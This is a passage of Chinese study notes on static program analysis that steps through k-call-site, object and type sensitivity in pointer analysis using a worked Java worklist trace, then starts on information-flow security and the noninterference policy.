          <a href="#k-Call-Site-Sensitivity-k-CFA" class="heading-link"><i class="fas fa-link"></i></a><a href="#k-Call-Site-Sensitivity-k-CFA" class="headerlink" title="k-Call-Site Sensitivity/k-CFA"></a>k-Call-Site Sensitivity/k-CFA</h3>
      <p>加入一个<code>k</code>个数的限制</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302145404139.png" alt="image-20230302145404139"></p>
<p>即确保上下文个数为<code>k</code>个，如果超过了，就舍弃掉最老的上下文。</p>
<p>比如<code>k=2</code>,在<code>[2,3]</code>上下文中需要加入<code>[4]</code>，那么分析发现上下文个数超过<code>k</code>个，那么就舍弃掉<code>2</code>，新的上下文变成<code>[3,4]</code>。相当于是个缓存了。</p>

        <h4 id="实例-4"   >
          <a href="#实例-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4>
      <p>相关例子如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">()</span></span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Two</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span>; &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        C c = <span class="keyword">new</span> C();</span><br><span class="line">        c.m();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Number <span class="title">id</span><span class="params">(Number n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">m</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Number n1,n2,x,y;</span><br><span class="line">        n1 = <span class="keyword">new</span> One();</span><br><span class="line">        n2 = <span class="keyword">new</span> Two();</span><br><span class="line">        x = <span class="keyword">this</span>.id(n1);</span><br><span class="line">        y = <span class="keyword">this</span>.id(n2);</span><br><span class="line">        x.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>省略掉<code>C.S.Heap</code>方法以及<code>m</code>函数里的<code>this</code>变量。</p>

        <h5 id="初始化-1"   >
          <a href="#初始化-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h5>
      <p>首先是初始化，经过<code>AddReachable</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302150804549.png" alt="image-20230302150804549"></p>
<p>得到结果如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RM = &#123;[]:C.main()&#125;</span><br><span class="line">WL = [&lt;[]:c,&#123;O3&#125;&gt;]</span><br><span class="line">由于没有x=y之类的语句,没有调用到AddEdge</span><br><span class="line">CG = &#123;&#125;</span><br><span class="line">PFG = &#123;&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="WL处理-2"   >
          <a href="#WL处理-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#WL处理-2" class="headerlink" title="WL处理"></a>WL处理</h5>
      
        <h6 id="第一次迭代-5"   >
          <a href="#第一次迭代-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-5" class="headerlink" title="第一次迭代"></a>第一次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[]:c,&#123;O3&#125;&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;[]:C.main()&#125;;</span><br><span class="line">CG = &#123;&#125;;</span><br><span class="line">PFG = &#123;&#125;;</span><br><span class="line">n = []:c;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt([]:c) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG没有关于[]:c-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store,有函数调用</span><br><span class="line">ProcessCall(c:x,c&#x27;:Oi):</span><br><span class="line">	context_c = [];</span><br><span class="line">	m = C.m();</span><br><span class="line">	c^t = [4];</span><br><span class="line">	WL += &lt;[4]:m_this,&#123;O3&#125;&gt;;</span><br><span class="line">	CG += &#123;[]:4-&gt;[4]:C.m()&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[4]:C.m()&#125;;</span><br><span class="line">		WL += [&lt;[4]:n1,&#123;O12&#125;&gt;,&lt;[4]:n2,&#123;O13&#125;&gt;];</span><br><span class="line">		没有关于[4]:n1和[4]:n2的Load操作，退出函数</span><br><span class="line">    没有传参传返回值操作，退出函数</span><br></pre></td></tr></table></div></figure>


        <h6 id="第二次迭代-5"   >
          <a href="#第二次迭代-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-5" class="headerlink" title="第二次迭代"></a>第二次迭代</h6>
      <p>开始情况如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302152628874.png" alt="image-20230302152628874"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:C.m_this,&#123;O3&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:n1,&#123;O12&#125;&gt;,&lt;[4]:n2,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m()&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m()&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:C.m_this;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt([4]:C.m_this) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG没有关于[4]:C.m_this-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于[4]:C.m_this的成员没有相关Load和Store</span><br><span class="line"></span><br><span class="line">存在[4]:C.m_this的函数调用</span><br><span class="line">ProcessCall(c:x,c&#x27;:Oi):</span><br><span class="line">	context_c = [4];</span><br><span class="line">	</span><br><span class="line">	迭代第一次</span><br><span class="line">	m = C.id(Number);</span><br><span class="line">	c^t = [14];</span><br><span class="line">	CG += &#123;[4]:14-&gt;[14]:C.id(Number)&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[14]:C.id(Number)&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	AddEdge:</span><br><span class="line">		PFG += &#123;[4]:n1-&gt;[14]:n&#125;;</span><br><span class="line">		PFG += &#123;[14]:n-&gt;[4]:x&#125;;</span><br><span class="line">	</span><br><span class="line">	迭代第二次</span><br><span class="line">	m = C.id(Number);</span><br><span class="line">	c^t = [15];</span><br><span class="line">	CG += &#123;[4]:15-&gt;[15]:c.id(Number)&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[15]:C.id(Number)&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	AddEdge:</span><br><span class="line">		PFG += &#123;[4]:n2-&gt;[15]:n&#125;;</span><br><span class="line">		PFG += &#123;[15]:n-&gt;[4]:y&#125;;</span><br></pre></td></tr></table></div></figure>

<p>结果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302155654514.png" alt="image-20230302155654514"></p>
<p>后面几次迭代就是一些传播了，大致概括如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302161116389.png" alt="image-20230302161116389"></p>

        <h6 id="第三次迭代-4"   >
          <a href="#第三次迭代-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-4" class="headerlink" title="第三次迭代"></a>第三次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:n1,&#123;O12&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:n2,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:n1;</span><br><span class="line">pts = &#123;O12&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O12&#125; - &#123;&#125; = &#123;O12&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O12&#125;;</span><br><span class="line">	pt([4]:n1) = pt(n) = pts ⋃ pt(n) = &#123;O12&#125; ⋃ &#123;&#125; = &#123;O12&#125;;</span><br><span class="line">	WL += &lt;[14]:n,&#123;O12&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[4]:n1的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第四次迭代-2"   >
          <a href="#第四次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四次迭代-2" class="headerlink" title="第四次迭代"></a>第四次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:n2,&#123;O13&#125;&gt;;</span><br><span class="line">WL = [&lt;[14]:n,&#123;O12&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:n2;</span><br><span class="line">pts = &#123;O13&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O13&#125; - &#123;&#125; = &#123;O13&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O13&#125;;</span><br><span class="line">	pt([4]:n2) = pt(n) = pts ⋃ pt(n) = &#123;O13&#125; ⋃ &#123;&#125; = &#123;O13&#125;;</span><br><span class="line">	WL += &lt;[15]:n,&#123;O13&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[4]:n2的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第五次迭代-2"   >
          <a href="#第五次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五次迭代-2" class="headerlink" title="第五次迭代"></a>第五次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[14]:n,&#123;O12&#125;&gt;;</span><br><span class="line">WL = [&lt;[15]:n,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [14]:n;</span><br><span class="line">pts = &#123;O12&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O12&#125; - &#123;&#125; = &#123;O12&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O12&#125;;</span><br><span class="line">	pt([14]:n) = pt(n) = pts ⋃ pt(n) = &#123;O12&#125; ⋃ &#123;&#125; = &#123;O12&#125;;</span><br><span class="line">	WL += &lt;[4]:x,&#123;O12&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[14]:n的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第六次迭代-2"   >
          <a href="#第六次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六次迭代-2" class="headerlink" title="第六次迭代"></a>第六次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[15]:n,&#123;O13&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:x,&#123;O12&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [15]:n;</span><br><span class="line">pts = &#123;O13&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O13&#125; - &#123;&#125; = &#123;O13&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O13&#125;;</span><br><span class="line">	pt([15]:n) = pt(n) = pts ⋃ pt(n) = &#123;O13&#125; ⋃ &#123;&#125; = &#123;O13&#125;;</span><br><span class="line">	WL += &lt;[4]:y,&#123;O13&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于[15]:n的成员没有相关Load和Store以及函数调用，退出</span><br></pre></td></tr></table></div></figure>


        <h6 id="第七次迭代-1"   >
          <a href="#第七次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第七次迭代-1" class="headerlink" title="第七次迭代"></a>第七次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:x,&#123;O12&#125;&gt;;</span><br><span class="line">WL = [&lt;[4]:y,&#123;O13&#125;&gt;];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:x;</span><br><span class="line">pts = &#123;O12&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O12&#125; - &#123;&#125; = &#123;O12&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O12&#125;;</span><br><span class="line">	pt([4]:x) = pt(n) = pts ⋃ pt(n) = &#123;O12&#125; ⋃ &#123;&#125; = &#123;O12&#125;;</span><br><span class="line">	PFG没有关于[4]:x-&gt;xxx的流向</span><br><span class="line"></span><br><span class="line">关于[4]:x的成员存在函数调用</span><br><span class="line">ProcessCall(c:x,c&#x27;:Oi):</span><br><span class="line">	context_c = [4];</span><br><span class="line">	</span><br><span class="line">	迭代第一次</span><br><span class="line">	m = One.get();</span><br><span class="line">	c^t = [16];</span><br><span class="line">	CG += &#123;[4]:16-&gt;[16]:One.get()&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[16]:One.get()&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	迭代第二次</span><br><span class="line">	m = C.id(Number);</span><br><span class="line">	c^t = [15];</span><br><span class="line">	CG += &#123;[4]:15-&gt;[15]:c.id(Number)&#125;;</span><br><span class="line">	AddReachable(c^t:m):</span><br><span class="line">		RM += &#123;[15]:C.id(Number)&#125;;</span><br><span class="line">		没有新对象产生，退出函数</span><br><span class="line">	没有传参传返回值操作，退出函数</span><br></pre></td></tr></table></div></figure>


        <h6 id="第八次迭代-1"   >
          <a href="#第八次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第八次迭代-1" class="headerlink" title="第八次迭代"></a>第八次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;[4]:y,&#123;O13&#125;&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;[]:C.main(),[4]:C.m(),[14]:C.id(Number),[15]:C.id(Number)&#125;;</span><br><span class="line">CG = &#123;[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = [4]:y;</span><br><span class="line">pts = &#123;O13&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O13&#125; - &#123;&#125; = &#123;O13&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O13&#125;;</span><br><span class="line">	pt([4]:y) = pt(n) = pts ⋃ pt(n) = &#123;O13&#125; ⋃ &#123;&#125; = &#123;O13&#125;;</span><br><span class="line">	PFG没有关于[4]:y-&gt;xxx的流向</span><br><span class="line"></span><br><span class="line">关于[4]:y的成员没有相关Load和Store以及函数调用,退出函数</span><br></pre></td></tr></table></div></figure>

<p>到此<code>WL</code>清空，算法结束，最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302161839478.png" alt="image-20230302161839478"></p>

        <h3 id="Object-Sensitivity"   >
          <a href="#Object-Sensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Object-Sensitivity" class="headerlink" title="Object Sensitivity"></a>Object Sensitivity</h3>
      <p>和之前提到的<code>K-Call-Site</code>方法类似，以对象作为上下文的参照</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302163209957.png" alt="image-20230302163209957"></p>

        <h4 id="实例-5"   >
          <a href="#实例-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302165510010.png" alt="image-20230302165510010"></p>
<p>即针对调用时的<code>this</code>对象来作为一个上下文的标识。</p>

        <h3 id="Call-Site和Object-Sensitivity对比"   >
          <a href="#Call-Site和Object-Sensitivity对比" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call-Site和Object-Sensitivity对比" class="headerlink" title="Call-Site和Object-Sensitivity对比"></a>Call-Site和Object-Sensitivity对比</h3>
      <p>这里把<code>1-Call-Site</code>和``1-Object-Sensitivity`进行一个对比，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302165832151.png" alt="image-20230302165832151"></p>
<p>在该例子中，<code>1-Object</code>更加准确，但是另一个例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302165911690.png" alt="image-20230302165911690"></p>
<p><code>1-Call-Site</code>会更加准确。</p>
<p>所以在理论上，两者没有办法进行比较，但是在实际操作中，针对<code>OO</code>语言来说，<code>Object Sensitivity</code>更加好一点。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302170216610.png" alt="image-20230302170216610"></p>
<p>这个相关的一些对比如下，是两位讲课老师发表的论文，该论文提到一种更加行之有效的方法，只针对程序中一小部分内容运用<code>Object-Sensitivity</code>方法，会更加有效，不过这部分内容也需要一定的资源进行计算。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302170328419.png" alt="image-20230302170328419"></p>
<p>从运行的时间(越短越好)，调用图的边数(越少越好)，以及<code>cast</code>的转化失败可能性(越低越好)来对比，<code>object-Sensitivity</code>在<code>OO</code>语言上表现更好。</p>

        <h3 id="Type-Sensitivity"   >
          <a href="#Type-Sensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Type-Sensitivity" class="headerlink" title="Type Sensitivity"></a>Type Sensitivity</h3>
      <p>也有很多其他上下文挑选条件，比如<code>Type Sensitivity</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302170807480.png" alt="image-20230302170807480"></p>
<p>即在调用点所在类的类型作为筛选条件。</p>
<p>该方法的精度小于等于<code>Object-Sensitivity</code>，但是速度更快。而在实际上<code>Type-Sensitivity</code>的精度与<code>Object-Sensitivity</code>相差不是很多</p>

        <h3 id="总结对比"   >
          <a href="#总结对比" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302171308228.png" alt="image-20230302171308228"></p>
<p>以上三种方法针对<code>OO</code>语言，最终对比如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302171258044.png" alt="image-20230302171258044"></p>

        <h2 id="总结-6"   >
          <a href="#总结-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302171616516.png" alt="image-20230302171616516"></p>
<p>理解上下文指针分析的算法，通常的上下文几个<code>variants</code>变种，以及不同<code>variants</code>变种之间的对比差异等等。</p>

        <h1 id="十二、Static-Program-Analysis"   >
          <a href="#十二、Static-Program-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、Static-Program-Analysis" class="headerlink" title="十二、Static Program Analysis"></a>十二、Static Program Analysis</h1>
      
        <h2 id="1-Information-Flow-Security"   >
          <a href="#1-Information-Flow-Security" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Information-Flow-Security" class="headerlink" title="1.Information Flow Security"></a>1.Information Flow Security</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114214942.png" alt="image-20230304114214942"></p>
<p>即定义程序中变量的安全等级，明确不同安全等级之间的流动策略，以及相关的访问权限策略等。</p>

        <h3 id="Information-Flow"   >
          <a href="#Information-Flow" class="heading-link"><i class="fas fa-link"></i></a><a href="#Information-Flow" class="headerlink" title="Information Flow"></a>Information Flow</h3>
      <p><code>Information Flow</code>信息流相关概念就不用太说明了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304113722316.png" alt="image-20230304113722316"></p>

        <h3 id="Security-levels-Classes"   >
          <a href="#Security-levels-Classes" class="heading-link"><i class="fas fa-link"></i></a><a href="#Security-levels-Classes" class="headerlink" title="Security levels(Classes)"></a>Security levels(Classes)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114340189.png" alt="image-20230304114340189"></p>
<p>比较常见的就是<code>two-level policy</code>，低等密级和高等密级，或者一些更加复杂的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114618338.png" alt="image-20230304114618338"></p>

        <h3 id="Information-Flow-Policy"   >
          <a href="#Information-Flow-Policy" class="heading-link"><i class="fas fa-link"></i></a><a href="#Information-Flow-Policy" class="headerlink" title="Information Flow Policy"></a>Information Flow Policy</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304114843239.png" alt="image-20230304114843239"></p>
<p>常见的策略就是<code>Noninterference policy</code>非干涉策略，即高密级的不能流向低密级的，低密级可以流向高密级的</p>

        <h4 id="Noninterference"   >
          <a href="#Noninterference" class="heading-link"><i class="fas fa-link"></i></a><a href="#Noninterference" class="headerlink" title="Noninterference"></a>Noninterference</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230304115159940.png" alt="image-20230304115159940"></p>
<p>由上述例子大概可以知道该策略的相关的信息流动规则。</p>

        <h2 id="2-Confidentiality-and-Integrity"   >
